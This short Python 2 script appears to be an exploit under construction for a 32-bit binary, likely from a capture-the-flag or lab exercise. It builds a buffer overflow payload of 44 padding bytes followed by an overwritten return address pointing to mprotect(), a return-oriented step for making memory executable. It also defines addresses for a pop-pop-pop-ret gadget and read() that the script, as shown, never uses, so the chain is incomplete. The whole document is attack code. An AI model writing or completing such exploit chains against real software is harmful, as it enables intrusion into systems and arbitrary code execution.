import struct


def p(x):
    return struct.pack('<L', x)


mprotect = 0x80523e0
pop3ret = 0x8048882
read = 0x80517f0
# empty payload
payload = ""

#padding
payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

#mark memory as rwx
payload += p(mprotect)          # EIP to mprotect()


 
print payload
